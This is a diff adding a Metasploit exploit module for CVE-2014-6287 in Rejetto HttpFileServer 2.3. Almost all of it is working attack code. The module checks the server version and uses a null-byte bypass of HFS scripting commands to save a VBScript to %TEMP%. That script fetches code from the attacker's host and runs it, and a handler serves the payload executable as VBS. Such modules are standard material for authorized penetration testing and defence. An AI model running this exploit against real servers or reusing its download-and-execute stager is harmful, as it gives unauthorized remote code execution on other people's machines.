@@ -1,0 +1,121 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::HttpServer
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Rejetto HttpFileServer Remote Command Execution",
+      'Description'    => %q{
+        Rejetto HttpFileServer (HFS) is vulnerable to remote command execution attack due to a
+        poor regex in the file ParserLib.pas. This module exploit the HFS scripting commands by
+        using '%00' to bypass the filtering. This module has been tested successfully on HFS 2.3b
+        over Windows XP SP3, Windows 7 SP1 and Windows 8.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Daniele Linguaglossa <danielelinguaglossa[at]gmail.com>', # orginal discovery
+          'Muhamad Fadzil Ramli <mind1355[at]gmail.com>' # metasploit module
+        ],
+      'References'     =>
+        [
+          ['CVE', '2014-6287'],
+          ['OSVDB', '111386'],
+          ['URL', 'http://seclists.org/bugtraq/2014/Sep/85'],
+          ['URL', 'http://www.rejetto.com/wiki/index.php?title=HFS:_scripting_commands']
+        ],
+      'Payload'        => { 'BadChars' => "\x0d\x0a\x00" },
+      'Platform'       => 'win',
+      'Targets'        =>
+        [
+          [ 'Automatic', {} ],
+        ],
+      'Privileged'     => false,
+      'Stance'         => Msf::Exploit::Stance::Aggressive,
+      'DisclosureDate' => "Sep 11 2014",
+      'DefaultTarget'  => 0))
+
+      register_options(
+        [
+          OptString.new('TARGETURI', [true, 'The path of the web application', '/']),
+          OptInt.new('HTTPDELAY',    [false, 'Seconds to wait before terminating web server', 10]),
+        ], self.class)
+  end
+
+  def check
+    res = send_request_raw({
+      'method' => 'GET',
+      'uri'    => '/'
+    })
+
+    if res &&  res.headers['Server'] && res.headers['Server'] =~ /HFS ([\d.]+)/
+      version = $1
+      if Gem::Version.new(version) <= Gem::Version.new("2.3")
+        return Exploit::CheckCode::Detected
+      else
+        return Exploit::CheckCode::Safe
+      end
+    else
+      return Exploit::CheckCode::Safe
+    end
+  end
+
+  def on_request_uri(cli, req)
+    print_status("#{peer} - Payload request received: #{req.uri}")
+    exe = generate_payload_exe
+    vbs = Msf::Util::EXE.to_exe_vbs(exe)
+    send_response(cli, vbs, {'Content-Type' => 'application/octet-stream'})
+    # remove resource after serving 1st request as 'exec' execute 4x
+    # during exploitation
+    remove_resource(get_resource)
+  end
+
+  def primer
+    file_name = rand_text_alpha(rand(10)+5)
+    file_ext = '.vbs'
+    file_full_name = file_name + file_ext
+    vbs_path = "%TEMP%\\#{file_full_name}"
+
+    vbs_code = "Set x=CreateObject(\"Microsoft.XMLHTTP\")\x0d\x0a"
+    vbs_code << "On Error Resume Next\x0d\x0a"
+    vbs_code << "x.Open \"GET\",\"http://#{datastore['LHOST']}:#{datastore['SRVPORT']}#{get_resource}\",False\x0d\x0a"
+    vbs_code << "If Err.Number <> 0 Then\x0d\x0a"
+    vbs_code << "wsh.exit\x0d\x0a"
+    vbs_code << "End If\x0d\x0a"
+    vbs_code << "x.Send\x0d\x0a"
+    vbs_code << "Execute x.responseText"
+
+    payloads = [
+      "save|#{vbs_path}|#{vbs_code}",
+      "exec|wscript.exe //B //NOLOGO #{vbs_path}"
+    ]
+
+    print_status("Sending a malicious request to #{target_uri.path}")
+    payloads.each do |payload|
+      send_request_raw({
+        'method' => 'GET',
+        'uri'    => "/?search=%00{.#{URI::encode(payload)}.}"
+      })
+    end
+    register_file_for_cleanup(vbs_path)
+  end
+
+  def exploit
+    begin
+      Timeout.timeout(datastore['HTTPDELAY']) { super }
+    rescue Timeout::Error
+      # When the server stops due to our timeout, this is raised
+    end
+  end
+end
